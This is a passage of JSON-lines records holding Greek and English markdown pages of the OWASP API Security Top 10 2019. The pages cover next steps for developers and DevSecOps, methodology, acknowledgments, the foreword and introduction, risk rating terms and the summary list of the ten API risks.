(SIEM) για να συγκεντρώσετε και να διαχειριστείτε αρχεία καταγραφής από όλα τα στοιχεία των APIs και των κεντρικών υπολογιστών.\n* Δημιουργήστε εξατομικευμένους πίνακες παρακολούθησης ειδοποιήσεων (dashboards). Οι πίνακες αυτοί θα διευκολύνουν τον γρηγορότερο εντοπισμό και την διαχείριση ύποπτων δραστηριοτήτων.\n\n## Αναφορές (References)\n\n### Αναφορές OWASP\n\n* [OWASP Logging Cheat Sheet][2]\n* [OWASP Proactive Controls: Implement Logging and Intrusion Detection][3]\n* [OWASP Application Security Verification Standard: V7: Error Handling and\n  Logging Verification Requirements][4]\n\n### Εξωτερικές Αναφορές\n\n* [CWE-223: Omission of Security-relevant Information][5]\n* [CWE-778: Insufficient Logging][6]\n\n[1]: https://www.owasp.org/index.php/Log_Injection\n[2]: https://www.owasp.org/index.php/Logging_Cheat_Sheet\n[3]: https://www.owasp.org/index.php/OWASP_Proactive_Controls\n[4]: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md\n[5]: https://cwe.mitre.org/data/definitions/223.html\n[6]: https://cwe.mitre.org/data/definitions/778.html\n", "timestamp": "2025-10-24T22:26:24.087490"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xb0-next-devs.md", "content": "# Επόμενα Βήματα για Προγραμματιστές\n\nΗ εργασία δημιουργίας και συντήρησης ασφαλούς λογισμικού καθώς και η επιδιόρθωση αυτού είναι δύσκολη υπόθεση. \nΤο ίδιο ισχύει και για τα APIs.\n\nΠιστεύουμε ότι η εκπαίδευση και η ευαισθητοποίηση είναι βασικοί παράγοντες για τη δημιουργία ασφαλούς λογισμικού. \nΤα υπόλοιπα που απαιτούνται για την επίτευξη του στόχου, εξαρτώνται από τη δημιουργία και τη χρήση επαναλαμβανόμενων\nδιαδικασιών και τυπικών ελέγχων ασφαλείας.\n\nΤο OWASP διαθέτει πολλούς δωρεάν και ανοιχτούς πόρους για την αντιμετώπιση της ασφάλειας από την αρχή του έργου. \nΕπισκεφτείτε τη [σελίδα OWASP Projects][1] για την ολοκληρωμένη λίστα των διαθέσιμων έργων.\n\n| | |\n|-|-|\n| **Εκπαίδευση** | Μπορείτε να ξεκινήσετε να διαβάζετε το [υλικό του OWASP Education Project][2] ανάλογα με το επάγγελμα και το ενδιαφέρον σας. Για πρακτική μάθηση, προσθέσαμε το **crAPI** - **C**ompletely **R**idiculous **API** στον [οδικό μας χάρτη (roadmap)][3]. Εν τω μεταξύ, μπορείτε να εξασκηθείτε στο WebAppSec χρησιμοποιώντας το [OWASP DevSlop Pixi Module][4], μια ευάλωτη υπηρεσία WebApp και API που έχει σκοπό να διδάξει στους χρήστες πώς να δοκιμάζουν σύγχρονες εφαρμογές ιστού και API για ζητήματα ασφάλειας και πώς να γράφουν πιο ασφαλή APIs στο μέλλον. Μπορείτε επίσης να παρακολουθήσετε εκπαιδευτικές συνεδρίες του [Συνεδρίου OWASP AppSec][5] ή να [εγγραφείτε στο τοπικό σας τμήμα][6].\n| **Απαιτήσεις Ασφαλείας** | Η ασφάλεια πρέπει να είναι μέρος κάθε έργου (project) από την αρχή. Όταν βρίσκεστε στο στάδιο της εξαγωγής απαιτήσεων (requirements elicitation), είναι σημαντικό να ορίσετε τι σημαίνει \"ασφαλές\" για το έργο σας. Το OWASP συνιστά να χρησιμοποιείτε το [Πρότυπο Επαλήθευσης Ασφάλειας Εφαρμογών OWASP (ASVS) (OWASP Application Security Verification Standard)][7] ως οδηγό για τον καθορισμό των απαιτήσεων ασφαλείας. Εάν αναθέτετε το έργο σας σε εξωτερικούς συνεργάτες (outsourcing), εξετάστε το [Παράρτημα Σύμβασης Ασφαλούς Λογισμικού OWASP][8], το οποίο θα πρέπει να προσαρμοστεί σύμφωνα με την τοπική νομοθεσία και τους κανονισμούς της.|\n| **Αρχιτεκτονική Ασφαλείας** | Η ασφάλεια θα πρέπει να λαμβάνεται υπόψιν σε όλα τα στάδια του έργου. Τα [Σκονάκια Πρόληψης OWASP (OWASP Prevention Cheat Sheets)][9] είναι ένα καλό σημείο εκκίνησης για καθοδήγηση σχετικά με τον τρόπο σχεδιασμού ασφάλειας κατά τη φάση σχεδιασμού / αρχιτεκτονικής. Μεταξύ πολλών άλλων, θα βρείτε το σκονάκι [REST Security Cheat Sheet][10] και το σκονάκι [REST Assessment Cheat Sheet][11].|\n| **Τυπικοί Έλεγχοι Ασφαλείας** | Η υιοθέτηση Τυποποιημένων Μηχανισμών Ελέγχων Ασφαλείας (Standard Security Controls) μειώνει τον κίνδυνο εισαγωγής αδυναμιών ασφαλείας κατά την διάρκεια υλοποίησης της λογικής του λογισμικού σας. Παρά το γεγονός ότι πολλά σύγχρονα frameworks διαθέτουν πλέον ενσωματωμένους τυπικούς αποτελεσματικούς ελέγχους, τα [OWASP Proactive Controls][12] σας παρέχουν μια καλή επισκόπηση των στοιχείων ελέγχου ασφαλείας που πρέπει να συμπεριλάβετε στο έργο σας. Το OWASP παρέχει επίσης ορισμένες βιβλιοθήκες και εργαλεία που μπορεί να σας φανούν πολύτιμα, όπως στοιχεία ελέγχου επικύρωσης (validation controls).|\n| **Κύκλος Ζωής Ασφαλούς Ανάπτυξης Λογισμικού** | Μπορείτε να χρησιμοποιήσετε το [OWASP Software Assurance Maturity Model (SAMM)][13] για να βελτιώσετε τη διαδικασία κατά τη δημιουργία των APIs. Πολλά ακόμα έργα OWASP είναι διαθέσιμα για να σας βοηθήσουν σε όλες τις διαφορετικές φάσεις ανάπτυξης API, π.χ., το [Έργο Αναθεώρησης Κώδικα OWASP (OWASP Code Review Project)][14]. |\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Project\n[2]: https://www.owasp.org/index.php/OWASP_Education_Material_Categorized\n[3]: https://www.owasp.org/index.php/OWASP_API_Security_Project#tab=Road_Map\n[4]: https://devslop.co/Home/Pixi\n[5]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[6]: https://www.owasp.org/index.php/OWASP_Chapter\n[7]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[8]: https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex\n[9]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[10]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Security_Cheat_Sheet.md\n[11]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[12]: https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2018\n[13]: https://www.owasp.org/index.php/OWASP_SAMM_Project\n[14]: https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project\n", "timestamp": "2025-10-24T22:26:24.198092"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xb1-next-devsecops.md", "content": "# Επόμενα Βήματα για DevSecOps\n\nΛόγω της σημασίας τους στις σύγχρονες αρχιτεκτονικές εφαρμογών, η δημιουργία ασφαλών API είναι ζωτικής σημασίας. \nΗ ασφάλεια δεν μπορεί να παραμεληθεί και θα πρέπει να αποτελεί μέρος ολόκληρου του κύκλου ζωής της ανάπτυξης των APIs. \nΗ σάρωση (scanning) και οι ετήσιες δοκιμές διείσδυσης (penetration tests) δεν είναι πλέον αρκετές.\n\nΟι DevSecOps θα πρέπει να συμμετάσχουν στην προσπάθεια ανάπτυξης, διευκολύνοντας τις συνεχείς δοκιμές ασφαλείας \nσε ολόκληρο τον κύκλο ζωής ανάπτυξης λογισμικού. Στόχος τους είναι να ενισχύσουν τον αγωγό ανάπτυξης (development pipeline) με \nαυτοματισμό ασφαλείας (security automation), χωρίς να επηρεάζουν την ταχύτητα ανάπτυξης.\n\nΓια περισσότερες πληροφορίες, μπορείτε να ελέγχετε συχνά το [DevSecOps Manifesto][1] για να μείνετε ενημερωμένοι.\n\n| | |\n|-|-|\n| **Κατανοήστε το Μοντέλο Απειλής (Threat Model)** | Οι προτεραιότητες δοκιμών (testing priorities) προέρχονται από ένα μοντέλο απειλής (threat model). Εάν δεν έχετε μοντέλο απειλής, εξετάστε το ενδεχόμενο να χρησιμοποιήσετε το [Πρότυπο Επαλήθευσης Ασφάλειας Εφαρμογών OWASP (OWASP Application Security Verification Standard) (ASVS)][2] και τον [Οδηγό Δοκιμής OWASP (OWASP Testing Guide)][3]. Η συμμετοχή της ομάδας ανάπτυξης μπορεί να βοηθήσει τους προγραμματιστές να γίνουν περισσότερο ενήμεροι για την ασφάλεια.|\n| **Κατανoήστε το SDLC** | Γίνετε μέλος της ομάδας ανάπτυξης για να κατανοήσετε καλύτερα τον Κύκλο Ζωής Ανάπτυξης Λογισμικού. Η συνεισφορά σας στις συνεχείς δοκιμές ασφαλείας θα πρέπει να είναι συμβατή με τα άτομα, τις διαδικασίες και τα εργαλεία που έχουν θεσπιστεί. Να επισημανθεί ότι πρέπει να συμφωνούν όλοι με τη διαδικασία, ώστε να μην υπάρχουν περιττές τριβές ή αντιστάσεις. |\n| **Στρατηγικές Testing** | Καθώς η εργασία σας δεν πρέπει να επηρεάζει την ταχύτητα ανάπτυξης του API, θα πρέπει να επιλέξετε με σύνεση την καλύτερη (απλή, ταχύτερη, πιο ακριβή) τεχνική για να επαληθεύσετε τις απαιτήσεις ασφαλείας. Το [Γνωσιακό Πλαίσιο Ασφαλείας OWASP (OWASP Security Knowledge Framework)][4] και το [Πρότυπο Επαλήθευσης Ασφάλειας Εφαρμογών OWASP (OWASP Application Security Verification Standard)][5] μπορούν να αποτελέσουν εξαιρετικές πηγές λειτουργικών και μη λειτουργικών απαιτήσεων ασφαλείας. Υπάρχουν άλλες εξαιρετικές πηγές για [Έργα][6] και [Εργαλεία][7] παρόμοιες με αυτήν που προσφέρει η [Κοινότητα DevSecOps][8].|\n| **Επίτευξη Κάλυψης (Coverage) και ακρίβειας (Accuracy)** | Είστε η γέφυρα μεταξύ προγραμματιστών και ομάδων λειτουργιών (operation teams). Για να πετύχετε κάλυψη (coverage), δεν πρέπει να εστιάσετε μόνο στη λειτουργικότητα, αλλά και στην ενορχήστρωση. Εργαστείτε από την αρχή κοντά στις ομάδες ανάπτυξης και λειτουργίας, ώστε να βελτιστοποιήσετε τον χρόνο και την προσπάθειά σας. Θα πρέπει να στοχεύσετε σε μια κατάσταση όπου η βασική ασφάλεια επαληθεύεται συνεχώς. |\n| **Επικοινωνήστε με σαφήνεια τα ευρήματα** | Συνεισφέρετε αξία με λιγότερη ή καθόλου τριβή. Παραδώστε τα ευρήματα σας έγκαιρα, μέσα στα εργαλεία που χρησιμοποιούν οι ομάδες ανάπτυξης (όχι αρχεία PDF). Γίνετε μέλος της ομάδας ανάπτυξης για να αντιμετωπίσετε τα ευρήματα. Εκμεταλλευτείτε την ευκαιρία για να τους εκπαιδεύσετε, περιγράφοντας ξεκάθαρα την αδυναμία και πώς μπορεί να γίνει κατάχρηση της, συμπεριλαμβάνοντας ένα σενάριο επίθεσης για να γίνετε κατανοητοί.|\n\n[1]: https://www.devsecops.org/\n[2]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[3]: https://www.owasp.org/index.php/OWASP_Testing_Project\n[4]: https://www.owasp.org/index.php/OWASP_Security_Knowledge_Framework\n[5]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[6]: http://devsecops.github.io/\n[7]: https://github.com/devsecops/awesome-devsecops\n[8]: http://devsecops.org\n", "timestamp": "2025-10-24T22:26:24.314614"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xd0-about-data.md", "content": "# Μεθοδολογία και Δεδομένα\n\n## Σύνοψη\n\nΔεδομένου ότι η βιομηχανία AppSec δεν έχει εστιάσει στην πιο πρόσφατη αρχιτεκτονική εφαρμογών, \nστην οποία τα API διαδραματίζουν σημαντικό ρόλο, η σύνταξη μιας λίστας με τους δέκα πιο κρίσιμους \nκινδύνους ασφαλείας API, με βάση μια δημόσια πρόσκληση για δεδομένα, θα ήταν δύσκολο έργο. \nΠαρά το γεγονός ότι δεν υπάρχει δημόσια κλήση δεδομένων, η προκύπτουσα λίστα Top 10 εξακολουθεί \nνα βασίζεται σε δημόσια διαθέσιμα δεδομένα, συνεισφορές ειδικών σε θέματα ασφαλείας και σε ανοιχτή συζήτηση \nμε την κοινότητα ασφαλείας. \n\n## Μεθοδολογία και Δεδομένα\n\nΣτην πρώτη φάση συλλέχθηκαν, εξετάστηκαν και κατηγοριοποιήθηκαν δημόσια δεδομένα σχετικά \nμε συμβάντα ασφαλείας API από μια ομάδα ειδικών σε θέματα ασφαλείας. Τα δεδομένα αυτά συλλέχθηκαν \nαπό πλατφόρμες επιβράβευσης σφαλμάτων (bug bounty platforms) και βάσεις δεδομένων ευπάθειας, τα οποία καταχωρήθηκαν στο χρονικό διάστημα ενός έτους και χρησιμοποιήθηκαν για στατιστικούς σκοπούς.\n\nΣτην επόμενη φάση οι επαγγελματίες ασφαλείας με εμπειρία σε δοκιμές διείσδυσης\n(penetration testing) κλήθηκαν να συντάξουν τη δική τους λίστα Top 10.\n\nΗ [OWASP Risk Rating Methodology][1] χρησιμοποιήθηκε για την εκτέλεση της Ανάλυσης Κινδύνου. \nΟι βαθμολογίες συζητήθηκαν και αναθεωρήθηκαν μεταξύ των επαγγελματιών ασφαλείας. \nΓια περισσότερες πληροφορίες σχετικά με αυτά τα θέματα ανατρέξτε στην ενότητα [Κίνδυνοι Ασφαλείας API][2].\n\nΤο πρώτο προσχέδιο του OWASP API Security Top 10 2019 προέκυψε από συναίνεση των \nστατιστικών αποτελεσμάτων της πρώτης φάσης και από τις λίστες που προετοίμασαν οι επαγγελματίες ασφαλείας. \nΤο προσχέδιο υποβλήθηκε στη συνέχεια για εκτίμηση και αξιολόγηση από άλλη ομάδα \nεπαγγελματιών ασφαλείας, με σχετική εμπειρία στους τομείς ασφαλείας API.\n\nΤο OWASP API Security Top 10 2019 παρουσιάστηκε για πρώτη φορά στην εκδήλωση \nOWASP Global AppSec Tel Aviv (Μάιος 2019). Από τότε είναι διαθέσιμο στο GitHub \nγια δημόσια συζήτηση και συνεισφορές.\n\nΗ λίστα των συντελεστών είναι διαθέσιμη στην ενότητα [Ευχαριστίες][3].\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:24.539822"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xd1-acknowledgments.md", "content": "# Ευχαριστίες\n\n## Ευχαριστίες προς τους Συντελεστές\n\nΘα θέλαμε να ευχαριστήσουμε τους ακόλουθους συντελεστές που συνεισέφεραν δημόσια στο GitHub ή με άλλα μέσα:\n\n* 007divyachawla\n* Abid Khan\n* Adam Fisher\n* anotherik\n* bkimminich\n* caseysoftware\n* Chris Westphal\n* dsopas\n* DSotnikov\n* emilva\n* ErezYalon\n* flascelles\n* Guillaume Benats\n* IgorSasovets\n* Inonshk\n* JonnySchnittger\n* jmanico\n* jmdx\n* Keith Casey\n* kozmic\n* LauraRosePorter\n* Matthieu Estrade\n* nathanawmk\n* PauloASilva\n* pentagramz\n* philippederyck\n* pleothaud\n* r00ter\n* Raj kumar\n* Sagar Popat\n* Stephen Gates\n* thomaskonrad\n* xycloops123\n", "timestamp": "2025-10-24T22:26:24.649048"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0x00-header.md", "content": "---\ntitle: ''\n---\n\n![OWASP LOGO](./images/owasp-logo.png)\n\n# OWASP API Security Top 10 2019\n\nThe Ten Most Critical API Security Risks\n\nMay 29th, 2019\n\n![WASP Logo URL TBA](./images/front-wasp.png)\n\n| | | |\n| - | - | - |\n| https://owasp.org | This work is licensed under a [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n\n\n", "timestamp": "2025-10-24T22:26:25.286337"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0x00-notice.md", "content": "# Notice\n\nThis is the text version of OWASP API Security Top 10, used as source for the\nofficial version distributed as a Portable Document Format (PDF).\n\nContributions to the project such as comments, corrections, or translations\nshould be done here. For details on [How To Contribute][1], please refer to\n[CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n\n[1]: ../../../CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:25.405321"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0x00-toc.md", "content": "# Table of Contents\n\n* [Table of Contents](0x00-toc.md)\n* [About OWASP](0x01-about-owasp.md)\n* [Foreword](0x02-foreword.md)\n* [Introduction](0x03-introduction.md)\n* [Release Notes](0x04-release-notes.md)\n* [API Security Risks](0x10-api-security-risks.md)\n* [OWASP Top 10 API Security Risks – 2019](0x11-t10.md)\n* [API1:2019 Broken Object Level Authorization](0xa1-broken-object-level-authorization.md)\n* [API2:2019 Broken User Authentication](0xa2-broken-user-authentication.md)\n* [API3:2019 Excessive Data Exposure](0xa3-excessive-data-exposure.md)\n* [API4:2019 Lack of Resources & Rate Limiting](0xa4-lack-of-resources-and-rate-limiting.md)\n* [API5:2019 Broken Function Level Authorization](0xa5-broken-function-level-authorization.md)\n* [API6:2019 Mass Assignment](0xa6-mass-assignment.md)\n* [API7:2019 Security Misconfiguration](0xa7-security-misconfiguration.md)\n* [API8:2019 Injection](0xa8-injection.md)\n* [API9:2019 Improper Assets Management](0xa9-improper-assets-management.md)\n* [API10:2019 Insufficient Logging & Monitoring](0xaa-insufficient-logging-monitoring.md)\n* [What's Next For Developers](0xb0-next-devs.md)\n* [What's Next For DevSecOps](0xb1-next-devsecops.md)\n* [Methodology and Data](0xd0-about-data.md)\n* [Acknowledgments](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:25.517935"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0x01-about-owasp.md", "content": "# About OWASP\n\nThe Open Web Application Security Project (OWASP) is an open community dedicated\nto enabling organizations to develop, purchase, and maintain applications and\nAPIs that can be trusted.\n\nAt OWASP, you'll find free and open:\n\n* Application security tools and standards.\n* Complete books on application security testing, secure code development, and\n  secure code review.\n* Presentations and [videos][1].\n* [Cheat sheets][2] on many common topics.\n* Standard security controls and libraries.\n* [Local chapters worldwide][3].\n* Cutting edge research.\n* Extensive [conferences worldwide][4].\n* [Mailing lists][5].\n\nLearn more at: [https://www.owasp.org][6].\n\nAll OWASP tools, documents, videos, presentations, and chapters are free and\nopen to anyone interested in improving application security.\n\nWe advocate approaching application security as a people, process, and\ntechnology problem, because the most effective approaches to application\nsecurity require improvements in these areas.\n\nOWASP is a new kind of organization. Our freedom from commercial pressures\nallows us to provide unbiased, practical, and cost-effective information about\napplication security.\n\nOWASP is not affiliated with any technology company, although we support the\ninformed use of commercial security technology. OWASP produces many types of\nmaterials in a collaborative, transparent, and open way.\n\nThe OWASP Foundation is the non-profit entity that ensures the project's\nlong-term success. Almost everyone associated with OWASP is a volunteer,\nincluding the OWASP board, chapter leaders, project leaders, and project\nmembers. We support innovative security research with grants and infrastructure.\n\nCome join us!\n\n## Copyright and License\n\n![license](images/license.png)\n\nCopyright © 2003-2019 The OWASP Foundation. This document is released under the\n[Creative Commons Attribution Share-Alike 4.0 license][7]. For any reuse or\ndistribution, you must make it clear to others the license terms of this work.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[3]: https://www.owasp.org/index.php/OWASP_Chapter\n[4]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[5]: https://lists.owasp.org/mailman/listinfo\n[6]: https://www.owasp.org\n[7]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:25.633569"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0x02-foreword.md", "content": "# Foreword\n\nA foundational element of innovation in today’s app-driven world is the\nApplication Programming Interface (API). From banks, retail, and transportation\nto IoT, autonomous vehicles, and smart cities, APIs are a critical part of\nmodern mobile, SaaS, and web applications and can be found in customer-facing,\npartner-facing, and internal applications.\n\nBy nature, APIs expose application logic and sensitive data such as Personally\nIdentifiable Information (PII) and because of this, APIs have increasingly\nbecome a target for attackers. Without secure APIs, rapid innovation would be\nimpossible.\n\nAlthough a broader web application security risks Top 10 still makes sense, due\nto their particular nature, an API-specific security risks list is required.\nAPI security focuses on strategies and solutions to understand and mitigate the\nunique vulnerabilities and security risks associated with APIs.\n\nIf you're familiar with the [OWASP Top 10 Project][1], then you'll notice the\nsimilarities between both documents: they are intended for readability and\nadoption. If you're new to the OWASP Top 10 series, you may be better off\nreading the [API Security Risks][2] and [Methodology and Data][3] sections\nbefore jumping into the Top 10 list.\n\nYou can contribute to OWASP API Security Top 10 with your questions, comments,\nand ideas at our GitHub project repository:\n\n* https://github.com/OWASP/API-Security/issues\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nYou can find the OWASP API Security Top 10 here:\n\n* https://www.owasp.org/index.php/OWASP_API_Security_Project\n* https://github.com/OWASP/API-Security\n\nWe wish to thank all the contributors who made this project possible with their\neffort and contributions. They are all listed in the [Acknowledgments\nsection][4]. Thank you!\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:25.739775"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0x03-introduction.md", "content": "# Introduction\n\n## Welcome to the OWASP API Security Top 10 - 2019!\n\nWelcome to the first edition of the OWASP API Security Top 10. If you're\nfamiliar with the  OWASP Top 10 series, you'll notice the similarities: they are\nintended for readability and adoption. Otherwise, consider visiting the [OWASP\nAPI Security Project wiki page][1], before digging deeper into the most critical\nAPI security risks.\n\nAPIs play a very important role in modern applications' architecture. Since\ncreating security awareness and innovation have different paces, it's important\nto focus on common API security weaknesses.\n\nThe primary goal of the OWASP API Security Top 10 is to educate those involved\nin API development and maintenance, for example, developers, designers,\narchitects, managers, or organizations.\n\nIn the [Methodology and Data][2] section, you can read more about how this first\nedition was created. In future versions, we want to involve the security\nindustry, with a public call for data. For now, we encourage everyone to\ncontribute with questions, comments, and ideas at our [GitHub repository][3] or\n[Mailing list][4].\n\n[1]: https://www.owasp.org/index.php/OWASP_API_Security_Project\n[2]: ./0xd0-about-data.md\n[3]: https://github.com/OWASP/API-Security\n[4]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:25.854341"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0x04-release-notes.md", "content": "# Release Notes\n\nThis is the first OWASP API Security Top 10 edition, which we plan to be updated\nperiodically, every three or four years.\n\nUnlike this version, in future versions, we want to make a public call for data,\ninvolving the security industry in this effort. In the [Methodology and Data][1]\nsection, you'll find more details about how this version was built. For more\ndetails about the security risks, please refer to the [API Security Risks][2]\nsection.\n\nIt is important to realize that over the last few years, architecture of \napplications has significantly changed. Currently, APIs play a very important\nrole in this new architecture of microservices, Single Page Applications (SPAs),\nmobile apps, IoT, etc.\n\nThe OWASP API Security Top 10 was a required effort to create awareness about\nmodern API security issues. It was only possible due to a great effort of\nseveral volunteers, all of them listed in the [Acknowledgments][3] section.\nThank you!\n\n[1]: ./0xd0-about-data.md\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:25.958754"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0x10-api-security-risks.md", "content": "# API Security Risks\n\nThe [OWASP Risk Rating Methodology][1] was used to do the risk analysis.\n\nThe table below summarizes the terminology associated with the risk score.\n\n| Threat Agents | Exploitability | Weakness Prevalence | Weakness Detectability | Technical Impact | Business Impacts |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| API Specific | Easy: **3** | Widespread **3** | Easy **3** | Severe **3** | Business Specific |\n| API Specific | Average: **2** | Common **2** | Average **2** | Moderate **2** | Business Specific |\n| API Specific | Difficult: **1** | Difficult **1** | Difficult **1** | Minor **1** | Business Specific |\n\n**Note**: This approach does not take the likelihood of the threat agent into\naccount. Nor does it account for any of the various technical details associated\nwith your particular application. Any of these factors could significantly\naffect the overall likelihood of an attacker finding and exploiting a particular\nvulnerability. This rating does not take into account the actual impact on your\nbusiness. Your organization will have to decide how much security risk from\napplications and APIs the organization is willing to accept given your culture,\nindustry, and regulatory environment. The purpose of the OWASP API Security Top\n10 is not to do this risk analysis for you.\n\n## References\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### External\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: https://www.owasp.org/index.php/Threat_Risk_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:26.081007"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0x11-t10.md", "content": "# OWASP Top 10 API Security Risks – 2019\n\n| Risk | Description |\n| ---- | ----------- |\n| API1:2019 - Broken Object Level Authorization | APIs tend to expose endpoints that handle object identifiers, creating a wide attack surface Level Access Control issue. Object level authorization checks should be considered in every function that accesses a data source using an input from the user. |\n| API2:2019 - Broken User Authentication | Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens or to exploit implementation flaws to assume other user's identities temporarily or permanently. Compromising system's ability to identify the client/user, compromises API security overall. |\n| API3:2019 - Excessive Data Exposure | Looking forward to generic implementations, developers tend to expose all object properties without considering their individual sensitivity, relying on clients to perform the data filtering before displaying it to the user. |\n| API4:2019 - Lack of Resources & Rate Limiting | Quite often, APIs do not impose any restrictions on the size or number of resources that can be requested by the client/user. Not only can this impact the API server performance, leading to Denial of Service (DoS), but also leaves the door open to authentication flaws such as brute force. |\n| API5:2019 - Broken Function Level Authorization | Complex access control policies with different hierarchies, groups, and roles, and an unclear separation between administrative and regular functions, tend to lead to authorization flaws. By exploiting these issues, attackers gain access to other users’ resources and/or administrative functions. |\n| API6:2019 - Mass Assignment | Binding client provided data (e.g., JSON) to data models, without proper properties filtering based on a whitelist, usually lead to Mass Assignment. Either guessing objects properties, exploring other API endpoints, reading the documentation, or providing additional object properties in request payloads, allows attackers to modify object properties they are not supposed to. |\n| API7:2019 - Security Misconfiguration | Security misconfiguration is commonly a result of unsecure default configurations, incomplete or ad-hoc configurations, open cloud storage, misconfigured HTTP headers, unnecessary HTTP methods, permissive Cross-Origin resource sharing (CORS), and verbose error messages containing sensitive information. |\n| API8:2019 - Injection | Injection flaws, such as SQL, NoSQL, Command Injection, etc., occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's malicious data can trick the interpreter into executing unintended commands or accessing data without proper authorization. |\n| API9:2019 - Improper Assets Management | APIs tend to expose more endpoints than traditional web applications, making proper and updated documentation highly important. Proper hosts and deployed API versions inventory also play an important role to mitigate issues such as deprecated API versions and exposed debug endpoints. |\n| API10:2019 - Insufficient Logging & Monitoring | Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems to tamper with, extract, or destroy data. Most breach studies demonstrate the time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring. |\n", "timestamp": "2025-10-24T22:26:26.195571"}
